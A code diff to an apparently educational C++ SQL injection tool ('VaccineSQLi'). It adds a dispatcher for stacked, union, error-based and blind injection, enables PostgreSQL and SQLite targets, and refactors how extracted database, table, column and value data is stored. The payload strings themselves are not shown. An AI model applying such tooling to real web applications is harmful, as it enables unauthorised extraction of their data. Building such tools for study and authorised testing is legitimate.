@@ -91,11 +91,45 @@ bool VaccineSQLi::fetch_data()
         return true;
 }
 
+void VaccineSQLi::process(const uint8& method_type)
+{
+        uint8 count = 1;
+        if (this->_db_type == ALL)
+                count = 4;
+        for (uint8 i = 0; i < count; ++i)
+        {
+                if (count != 1)
+                        this->_db_type = i + 1;
+                switch (method_type)
+                {
+                case STACKED:
+                        this->stacked_queries();
+                        break;
+                case UNION:
+                        this->union_based();
+                        break;
+                case ERROR:
+                        this->error_based();
+                        break;
+                case BLIND:
+                        this->blind_based();
+                        break;
+                default:
+                        break;
+                }
+        }
+        if (count != 1)
+                this->_db_type = ALL;
+}
+
 void VaccineSQLi::stacked_queries()
 {
+        if (this->_db_type == ALL)
+                std::cerr << "[ ERROR ] Please select a specific database type first."
+                          << std::endl;
         if (this->_db_type != MYSQL)
         {
-                std::cerr << "[ ERROR ] Can't perform stacked queries SQLi"
+                std::cout << "[ INFO ] Can't perform stacked queries SQLi"
                           << " on " << this->db_type_tostr() << "."
                           << std::endl;
                 return;
@@ -111,18 +145,36 @@ void VaccineSQLi::stacked_queries()
 
 void VaccineSQLi::union_based()
 {
+        if (this->_db_type == ALL)
+                std::cerr << "[ ERROR ] Please select a specific database type first."
+                          << std::endl;
         std::string offset;
         this->_method_type = UNION;
         this->_launch(t_config({
             sptr_vector({&offset}),
             sptr_vector({&offset, &offset}),
-            sptr_vector({&offset}),
+            (this->_db_type != SQLITE
+                 ? sptr_vector({&offset})
+                 : sptr_vector({&offset, &offset})),
             sptr_vector({&offset}),
         }));
 }
 
 void VaccineSQLi::error_based()
 {
+        if (this->_db_type == ALL)
+        {
+                std::cerr << "[ ERROR ] Please select a specific database type first."
+                          << std::endl;
+                return;
+        }
+        if (this->_db_type == SQLITE)
+        {
+                std::cerr << "[ ERROR ] Can't perform error based SQLi"
+                          << " on " << this->db_type_tostr() << "."
+                          << std::endl;
+                return;
+        }
         std::string index = "0";
         this->_method_type = ERROR;
         this->_launch(t_config({
@@ -135,13 +187,19 @@ void VaccineSQLi::error_based()
 
 void VaccineSQLi::blind_based()
 {
+        if (this->_db_type == ALL)
+                std::cerr << "[ ERROR ] Please select a specific database type first."
+                          << std::endl;
         std::string record;
         std::string index = "0";
         std::string str_start = "1";
         std::string str = "!";
         std::string buffer;
         this->_method_type = BLIND;
-        this->_databases["ab"] = std::vector< int >();
+        if (this->_db_type != POSTGRESQL && this->_db_type != SQLITE)
+                this->_databases["ab"] = std::vector< int >();
+        else if (this->_db_type != SQLITE)
+                this->_databases["public"] = std::vector< int >();
         this->_launch(t_config({
             sptr_vector({&record, &index, &str_start, &str, &buffer, &buffer}),
             sptr_vector({&record, &index, &str_start, &str, &buffer, &buffer}),
@@ -247,7 +305,6 @@ bool VaccineSQLi::_init_launch()
         case MYSQL:
                 this->_excluded = sqli_mysql::excluded;
                 break;
-                /*
         case POSTGRESQL:
                 this->_excluded = sqli_postgresql::excluded;
                 break;
@@ -256,8 +313,12 @@ bool VaccineSQLi::_init_launch()
                 break;
         case SQLITE:
                 this->_excluded = sqli_sqlite::excluded;
+                if (this->_method_type == BLIND)
+                {
+                        this->_excluded.push_back("superusers");
+                        this->_excluded.push_back("users");
+                }
                 break;
-                */
         default:
                 return false;
         }
@@ -386,7 +447,6 @@ void VaccineSQLi::_fetch(
                 this->_ft_payload = sqli_mysql::payload;
                 this->_ft_parser = sqli_mysql::parser;
                 break;
-                /*
         case POSTGRESQL:
                 this->_ft_payload = sqli_postgresql::payload;
                 this->_ft_parser = sqli_postgresql::parser;
@@ -399,7 +459,6 @@ void VaccineSQLi::_fetch(
                 this->_ft_payload = sqli_sqlite::payload;
                 this->_ft_parser = sqli_sqlite::parser;
                 break;
-                */
         default:
                 return;
         }
@@ -426,14 +485,17 @@ void VaccineSQLi::_fetch_databases(
     sptr_vector& config,
     const uint8& value_type)
 {
-        short timeout = TIMEOUT;
+        uint8 timeout = TIMEOUT;
         std::string payload;
         str_vector parameters;
         str_vector response;
         while (true)
         {
-                if (this->_databases.empty() && --timeout == 0)
+                if (this->_method_type == UNION &&
+                    this->_databases.empty() &&
+                    --timeout == 0)
                         break;
+
                 payload = this->_ft_payload(
                     config,
                     this->_method_type,
@@ -447,7 +509,7 @@ void VaccineSQLi::_fetch_databases(
                 response = this->_ft_parser(
                     this->_process(this->_full_url, parameters),
                     config,
-                    this->_method_type, value_type);
+                    this->_method_type);
 
                 if (!this->_manage(
                         value_type, response,
@@ -461,22 +523,32 @@ void VaccineSQLi::_fetch_tables(
     const uint8& value_type,
     std::string& db_name)
 {
+        uint8 timeout = TIMEOUT;
+        std::string payload;
+        str_vector parameters;
+        str_vector response;
         while (true)
         {
-                const std::string payload = this->_ft_payload(
+                if (this->_db_type == SQLITE &&
+                    this->_method_type == UNION &&
+                    this->_databases.empty() &&
+                    --timeout == 0)
+                        break;
+
+                payload = this->_ft_payload(
                     config,
                     this->_method_type,
                     value_type);
                 this->_payloads.push_back(payload);
 
-                const str_vector parameters = this->_fill_parameters(
+                parameters = this->_fill_parameters(
                     this->_parameters,
                     payload);
 
-                const str_vector response = this->_ft_parser(
+                response = this->_ft_parser(
                     this->_process(this->_full_url, parameters),
                     config,
-                    this->_method_type, value_type);
+                    this->_method_type);
 
                 if (!this->_manage(
                         value_type, response,
@@ -517,7 +589,7 @@ void VaccineSQLi::_fetch_columns(
                         response = this->_ft_parser(
                             this->_process(this->_full_url, parameters),
                             config,
-                            this->_method_type, value_type);
+                            this->_method_type);
 
                         index = tab_index;
                         if (!this->_manage(
@@ -570,7 +642,7 @@ void VaccineSQLi::_fetch_values(
                                 response = this->_ft_parser(
                                     this->_process(this->_full_url, parameters),
                                     config,
-                                    this->_method_type, value_type);
+                                    this->_method_type);
 
                                 if (!this->_manage(
                                         value_type, response,
@@ -688,86 +760,27 @@ bool VaccineSQLi::_manage(
     const int* tab_index,
     const std::string* tab_name)
 {
-        int index;
         switch (this->_method_type)
         {
         case STACKED:
+                return this->_manage_stacked_queries(
+                    value_type,
+                    response,
+                    tab_index,
+                    tab_name);
         case UNION:
+                return this->_manage_union_based(
+                    value_type,
+                    response,
+                    tab_index,
+                    tab_name);
         case ERROR:
-                if (response.empty())
-                {
-                        if (this->_method_type == ERROR)
-                                config[ERROR_BASED_MARKED] = config[ERROR_BASED_INDEX];
-                        if (value_type == DATABASES)
-                                return this->_method_type == UNION;
-                        else
-                                return false;
-                }
-                switch (value_type)
-                {
-                case DATABASES:
-                        for (const auto& value : response)
-                                if (std::find(
-                                        this->_excluded.begin(),
-                                        this->_excluded.end(),
-                                        value) == this->_excluded.end())
-                                        this->_databases[value] =
-                                            std::vector< int >();
-                        break;
-                case TABLES:
-                        index = this->_tables.size();
-                        if (this->_method_type != ERROR ||
-                            (this->_method_type == ERROR && config[ERROR_BASED_MARKED]))
-                        {
-                                this->_tables.push_back(std::unordered_map< std::string, int >());
-                                this->_databases[*tab_name].push_back(index);
-                                if (this->_method_type == ERROR)
-                                        config[ERROR_BASED_MARKED] = NULL;
-                        }
-                        else if (this->_method_type == ERROR)
-                                index--;
-                        this->_databases[*tab_name].back() = index;
-
-                        for (const auto& value : response)
-                                this->_tables[index][value] = -1;
-                        break;
-                case COLUMNS:
-                        index = this->_columns.size();
-                        if (this->_method_type != ERROR ||
-                            (this->_method_type == ERROR && config[ERROR_BASED_MARKED]))
-                        {
-                                this->_columns.push_back(std::unordered_map< std::string, int >());
-                                if (this->_method_type == ERROR)
-                                        config[ERROR_BASED_MARKED] = NULL;
-                        }
-                        else if (this->_method_type == ERROR)
-                                index--;
-                        this->_tables[*tab_index][*tab_name] = index;
-
-                        for (const auto& value : response)
-                                this->_columns[index][value] = -1;
-                        break;
-                case VALUES:
-                        index = this->_values.size();
-                        if (this->_method_type != ERROR ||
-                            (this->_method_type == ERROR && config[ERROR_BASED_MARKED]))
-                        {
-                                this->_values.push_back(str_vector());
-                                if (this->_method_type == ERROR)
-                                        config[ERROR_BASED_MARKED] = NULL;
-                        }
-                        else if (this->_method_type == ERROR)
-                                index--;
-                        this->_columns[*tab_index][*tab_name] = index;
-
-                        for (const auto& value : response)
-                                this->_values[index].push_back(value);
-                        break;
-                default:
-                        break;
-                }
-                return this->_method_type == ERROR;
-
+                return this->_manage_error_based(
+                    value_type,
+                    response,
+                    config,
+                    tab_index,
+                    tab_name);
         case BLIND:
                 return this->_manage_blind_based(
                     value_type,
@@ -776,7 +789,175 @@ bool VaccineSQLi::_manage(
                     tab_index,
                     tab_name);
         default:
-                return false;
+                return STOP;
+        }
+}
+
+bool VaccineSQLi::_manage_stacked_queries(
+    const uint8& value_type,
+    const str_vector& response,
+    const int* tab_index,
+    const std::string* tab_name)
+{
+        if (response.empty())
+                return STOP;
+        int index;
+        switch (value_type)
+        {
+        case DATABASES:
+                for (const auto& value : response)
+                        if (std::find(
+                                this->_excluded.begin(),
+                                this->_excluded.end(),
+                                value) == this->_excluded.end())
+                                this->_databases[value] = std::vector< int >();
+                return STOP;
+        case TABLES:
+                index = this->_tables.size();
+                this->_tables.push_back(std::unordered_map< std::string, int >());
+                this->_databases[*tab_name].push_back(index);
+
+                for (const auto& value : response)
+                        this->_tables[index][value] = -1;
+                return STOP;
+        case COLUMNS:
+                index = this->_columns.size();
+                this->_columns.push_back(std::unordered_map< std::string, int >());
+                this->_tables[*tab_index][*tab_name] = index;
+
+                for (const auto& value : response)
+                        this->_columns[index][value] = -1;
+                return STOP;
+        case VALUES:
+                index = this->_values.size();
+                this->_values.push_back(str_vector());
+                this->_columns[*tab_index][*tab_name] = index;
+
+                for (const auto& value : response)
+                        this->_values[index].push_back(value);
+                return STOP;
+        default:
+                return STOP;
+        }
+}
+
+bool VaccineSQLi::_manage_union_based(
+    const uint8& value_type,
+    const str_vector& response,
+    const int* tab_index,
+    const std::string* tab_name)
+{
+        if (response.empty())
+                return (value_type == DATABASES ||
+                        (value_type == TABLES && this->_db_type == SQLITE));
+        int index;
+        switch (value_type)
+        {
+        case DATABASES:
+                for (const auto& value : response)
+                        if (std::find(
+                                this->_excluded.begin(),
+                                this->_excluded.end(),
+                                value) == this->_excluded.end())
+                                this->_databases[value] = std::vector< int >();
+                return STOP;
+        case TABLES:
+                index = this->_tables.size();
+                this->_tables.push_back(std::unordered_map< std::string, int >());
+                this->_databases[*tab_name].push_back(index);
+
+                for (const auto& value : response)
+                        if (this->_db_type != SQLITE)
+                                this->_tables[index][value] = -1;
+                        else if (std::find(
+                                     this->_excluded.begin(),
+                                     this->_excluded.end(),
+                                     value) == this->_excluded.end())
+                                this->_tables[index][value] = -1;
+                return STOP;
+        case COLUMNS:
+                index = this->_columns.size();
+                this->_columns.push_back(std::unordered_map< std::string, int >());
+                this->_tables[*tab_index][*tab_name] = index;
+
+                for (const auto& value : response)
+                        this->_columns[index][value] = -1;
+                return STOP;
+        case VALUES:
+                index = this->_values.size();
+                this->_values.push_back(str_vector());
+                this->_columns[*tab_index][*tab_name] = index;
+
+                for (const auto& value : response)
+                        this->_values[index].push_back(value);
+                return STOP;
+        default:
+                return STOP;
+        }
+}
+
+bool VaccineSQLi::_manage_error_based(
+    const uint8& value_type,
+    const str_vector& response,
+    sptr_vector& config,
+    const int* tab_index,
+    const std::string* tab_name)
+{
+        if (response.empty())
+        {
+                config[ERROR_BASED_MARKED] = config[ERROR_BASED_INDEX];
+                return STOP;
+        }
+        int index;
+        const std::string elem = response[0];
+        switch (value_type)
+        {
+        case DATABASES:
+                if (std::find(
+                        this->_excluded.begin(),
+                        this->_excluded.end(),
+                        elem) == this->_excluded.end())
+                        this->_databases[elem] = std::vector< int >();
+                return CONTINUE;
+        case TABLES:
+                index = this->_tables.size();
+                if (config[ERROR_BASED_MARKED])
+                {
+                        this->_tables.push_back(std::unordered_map< std::string, int >());
+                        this->_databases[*tab_name].push_back(index);
+                        config[ERROR_BASED_MARKED] = NULL;
+                }
+                else
+                        index--;
+                this->_databases[*tab_name].back() = index;
+                this->_tables[index][elem] = -1;
+                return CONTINUE;
+        case COLUMNS:
+                index = this->_columns.size();
+                if (config[ERROR_BASED_MARKED])
+                {
+                        this->_columns.push_back(std::unordered_map< std::string, int >());
+                        config[ERROR_BASED_MARKED] = NULL;
+                }
+                else
+                        index--;
+                this->_tables[*tab_index][*tab_name] = index;
+                this->_columns[index][elem] = -1;
+                return CONTINUE;
+        case VALUES:
+                index = this->_values.size();
+                if (config[ERROR_BASED_MARKED])
+                {
+                        this->_values.push_back(str_vector());
+                        config[ERROR_BASED_MARKED] = NULL;
+                }
+                else
+                        index--;
+                this->_columns[*tab_index][*tab_name] = index;
+                this->_values[index].push_back(elem);
+                return CONTINUE;
+        default:
+                return CONTINUE;
         }
 }
 
@@ -790,10 +971,10 @@ bool VaccineSQLi::_manage_blind_based(
         if (!response.empty())
         {
                 *config[BLIND_BASED_BUFFER] += response[0];
-                return true;
+                return CONTINUE;
         }
         if ((*config[BLIND_BASED_CMP])[0] != 127)
-                return true;
+                return CONTINUE;
 
         *config[BLIND_BASED_CMP] = "!";
         *config[BLIND_BASED_CMP_START] = "1";
@@ -803,14 +984,18 @@ bool VaccineSQLi::_manage_blind_based(
         if ((*config[BLIND_BASED_BUFFER]).empty())
         {
                 config[BLIND_BASED_MARKED] = config[BLIND_BASED_INDEX];
-                return false;
+                return STOP;
         }
         *config[BLIND_BASED_INDEX] = std::to_string(index + 1);
 
         switch (value_type)
         {
         case DATABASES:
-                this->_databases[*config[BLIND_BASED_BUFFER]] = std::vector< int >();
+                if (std::find(
+                        this->_excluded.begin(),
+                        this->_excluded.end(),
+                        *config[BLIND_BASED_BUFFER]) == this->_excluded.end())
+                        this->_databases[*config[BLIND_BASED_BUFFER]] = std::vector< int >();
                 break;
         case TABLES:
                 index = this->_tables.size();
@@ -822,7 +1007,13 @@ bool VaccineSQLi::_manage_blind_based(
                 }
                 else
                         index--;
-                this->_tables[index][*config[BLIND_BASED_BUFFER]] = -1;
+                if (this->_db_type != SQLITE)
+                        this->_tables[index][*config[BLIND_BASED_BUFFER]] = -1;
+                else if (std::find(
+                             this->_excluded.begin(),
+                             this->_excluded.end(),
+                             *config[BLIND_BASED_BUFFER]) == this->_excluded.end())
+                        this->_tables[index][*config[BLIND_BASED_BUFFER]] = -1;
                 break;
         case COLUMNS:
                 index = this->_columns.size();
@@ -849,8 +1040,8 @@ bool VaccineSQLi::_manage_blind_based(
                 this->_values[index].push_back(*config[BLIND_BASED_BUFFER]);
                 break;
         default:
-                return false;
+                return STOP;
         }
         (*config[BLIND_BASED_BUFFER]).clear();
-        return true;
+        return CONTINUE;
 }
